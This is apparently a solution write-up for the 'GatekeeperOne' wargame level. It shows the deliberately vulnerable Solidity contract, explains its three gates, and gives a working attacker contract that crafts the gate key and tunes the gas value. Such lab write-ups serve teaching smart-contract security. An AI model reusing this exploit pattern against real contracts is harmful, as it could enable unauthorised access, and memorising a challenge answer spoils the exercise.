<div align="center">

# GatekeeperOne

</div>



**GatekeeperOne (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 


1. **Understand the contract**

- `GatekeeperOne` protects `enter()` with three gates:

  - **Gate One:** `require(msg.sender != tx.origin)`  
    → caller must be a **contract** (you cannot call `enter` directly from your EOA).

  - **Gate Two:** `require(gasleft() % 8191 == 0)`  
    → the remaining gas at that point must be a multiple of `8191` — you must call with a carefully chosen gas amount so this condition holds inside `enter()`.

  - **Gate Three:** three checks on `_gateKey`:
    - `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))` (part one)  
    - `uint32(uint64(_gateKey)) != uint64(_gateKey)` (part two)  
    - `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))` (part three)  
    → the key must be crafted so its lower 16 bits equal the low 16 bits of your EOA, but the 32-bit and 64-bit views must satisfy the inequality (use bit manipulation to set the high bit).


1. **Exploit Method**

    i. **Deploy an attacker contract** (call it `Attack`) — this contract will call `GatekeeperOne.enter(...)` so `msg.sender != tx.origin` passes.

    ii. **Build the gate3 key** inside the attacker (or off-chain) using your EOA (`tx.origin`):
    - `uint16 k16 = uint16(uint160(tx.origin));`
    - `uint64 k64 = uint64(1 << 63) + uint64(k16);`  // set a high bit to satisfy the inequality
    - `bytes8 key = bytes8(k64);`

    iii. **Call `enter` from the attacker contract with a tuned gas value**:
    - From your EOA, call the attacker’s entry method which forwards the call to `GatekeeperOne.enter{gas: <computed>}(key)`.
    - Try different `gas` offsets (0 .. 8190) appended to a safe multiplier of 8191 until the check `gasleft() % 8191 == 0` inside `enter()` passes. In practice the attacker loops/tries small gas values until success.

    iv. **Verify success**
    - After a successful call, `gatekeeper.entrant()` should equal your EOA (`tx.origin`).



## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack {
    function enter( address _target, uint gas) external {
        GatekeeperOne target = GatekeeperOne(_target);

        uint16 k16 = uint16(uint160(tx.origin));

        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);


        require(gas < 8191, "gas >= 8191 ");
        require(target.enter{gas : 8191 * 10 + gas}(key), "Failed");
    }
}


```

---


